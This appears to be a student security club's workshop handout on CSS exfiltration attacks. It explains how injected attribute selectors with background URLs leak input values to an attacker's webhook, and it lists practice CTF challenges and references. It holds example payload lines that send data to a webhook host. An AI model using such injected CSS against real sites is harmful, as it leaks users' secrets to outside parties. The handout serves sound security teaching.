# Web 1: CSS Exfiltration Attack

### What is a CSS Exfiltration Attack?

A CSS Exfiltration Attack occurs when an attacker is able to inject CSS into a web page. While some elements on a page may be restricted from direct access, cleverly crafted CSS can be used to extract sensitive data. This is possible because certain CSS selectors and functions can indirectly leak information by triggering observable behaviors, such as generating HTTP requests. In some cases, CSS injection may also lead to JavaScript execution. Today, we are specifically focusing on the data exfiltration aspect of such attacks.

### What is a Webhook?

A Webhook is a mechanism that allows data to be sent to a unique URL when certain events occur. One way to explore this is by visiting webhook.site, a service that provides you with your own unique URL. This URL is private to you, and any visits to it are logged by the site. You can also send information along with each visit, making it a useful tool for testing and debugging webhooks. You can customize the path as well, such as using `webhook/whatever_you_want`, to organize or identify different events.

### How to perform a CSS Exfiltration Attack?
To perform a CSS Exfiltration Attack, tools like Style-Stealer assume that a secret is stored in an element such as `<input value="secret">`. The idea is to inject a CSS rule like `[value="a"] { background: url(webhook/a); }`, which targets an HTML element with a value attribute equal to "a". If such an element exists, the browser will attempt to load a background image from `webhook/a`, effectively making a request to your webhook URL. Although there's no actual image, the request itself logs the data access. Make sure to replace `"webhook"` with your own unique webhook URL from a site like webhook.site.

To expand this attack, rather than guessing exact values, you can use partial attribute selectors. For example, `[value^="a"]` targets elements whose `value` starts with "a", while `[value$="a"]` matches those that end with "a". These allow broader probing of values without brute-forcing every possibility. For convenience and scale, it’s recommended to write a Python script to automatically generate these CSS rules.

## Challenges

The following challenges in increasing difficulty are deployed to [platform.acmcyber.com](https://platform.acmcyber.com) to practice the concepts covered.

- `style-stealer-1`
- `style-stealer-2`
- `style-stealer-3`
- `style-stealer-4`
- `style-stealer-5`
- `style-stealer-6`
- `style-stealer-100`

## Resources

The following resources are great to practice/learn about the ciphers covered in the slides.

- [Webhook](http://webhook.site)
- [CSS Attribute Selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors)
- [Blind CSS Data Exfiltration](https://medium.com/@angryovalegg/blind-css-data-exfiltration-8dd6614236b2)
- [Testing for CSS Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection)


